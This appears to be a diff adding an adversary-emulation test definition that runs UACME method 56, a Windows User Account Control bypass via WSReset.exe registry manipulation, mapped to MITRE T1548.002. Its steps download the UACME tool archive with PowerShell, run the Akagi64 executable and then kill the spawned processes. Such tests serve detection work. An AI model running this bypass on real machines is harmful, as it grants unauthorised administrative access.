@@ -1,0 +1,57 @@
+api_version: "2.0"
+name: UACME Bypass Method 56
+description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+
+    Author: Hashim Jawad
+
+    Type:	Shell API
+
+    Method: Registry key manipulation
+
+    Target:	\system32\WSReset.exe
+
+    Component:	Attacker defined
+
+    Implementation:	ucmShellRegModMethod
+
+    UCM Method:	UacMethodShellWSReset
+
+    https://github.com/hfiref0x/UACME
+args:
+    - name: uacme_exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\uacme\56 Akagi64.exe
+uuid: 235ec031-cd2d-465d-a7ae-68bab281e80e
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1548: Abuse Elevation Control Mechanism'
+    subtechniques:
+        - 'T1548.002: Bypass User Account Control'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        UACME executable must exist on disk at specified location ("#{uacme_exe}")
+      inline: |
+        $tempPath = cmd /c echo #{uacme_exe}
+        if (Test-Path "$tempPath") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"
+        Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder\..\ExternalPayloads\uacme" -Force
+        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" -Force
+        }}
+      executor: powershell
+    - name: uacme-bypass-method-56
+      inline: |
+        "{{.Args.uacme_exe}}"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+            powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        executor: command_prompt
